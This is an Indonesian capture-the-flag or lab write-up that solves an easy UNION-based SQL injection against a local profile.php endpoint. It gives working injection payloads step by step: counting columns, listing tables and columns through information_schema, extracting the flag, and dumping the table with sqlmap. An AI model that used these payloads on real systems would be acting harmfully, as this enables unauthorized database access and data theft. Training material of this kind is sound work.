# Lab E6 - UNION Injection dengan Hidden Parameter (Easy)

## Informasi Lab
- **Endpoint**: `/profile.php?id=`
- **Tipe**: UNION Based Injection
- **Hint**: Hidden param - id parameter

## Analisis

### 1. Identifikasi
```
http://localhost/e6/profile.php?id=1
```
Menampilkan profil user.

### 2. Comment di Source
```php
// Hidden param - try id parameter
```

### 3. Test Vulnerable
```
?id=1'
```

## Solusi

### Langkah 1 - Konfirmasi Kolom
```
?id=1 ORDER BY 3  (OK)
?id=1 ORDER BY 4  (Error = 3 kolom)
```

### Langkah 2 - UNION Test
```
?id=-1 UNION SELECT 1,2,3
```

### Langkah 3 - Database Enumeration
```
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
```

Hasil: `flags, users`

### Langkah 4 - Column Enumeration
```
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flags'
```

Hasil: `id, flag`

### Langkah 5 - Get Flag
```
?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Payload Final
```
http://localhost/e6/profile.php?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tools
```bash
sqlmap -u "http://localhost/e6/profile.php?id=1" --dump -T flags
```
